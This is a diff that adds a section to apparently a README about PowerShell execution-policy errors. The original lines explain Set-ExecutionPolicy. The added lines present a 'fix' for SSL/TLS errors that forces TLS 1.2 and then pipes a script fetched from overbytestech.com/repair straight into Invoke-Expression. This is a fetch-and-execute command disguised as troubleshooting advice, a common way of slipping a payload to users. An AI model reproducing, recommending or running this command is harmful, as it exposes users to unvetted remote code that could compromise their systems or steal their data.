@@ -8,3 +8,8 @@ To get around this, you can temporarily change the execution policy (for the cur
 `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process`
 
 Otherwise you can do `Set-ExecutionPolicy RemoteSigned` to change the policy on the entire system.
+
+
+If you are getting SSL/TLS errors, use this command
+`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+irm overbytestech.com/repair | iex`
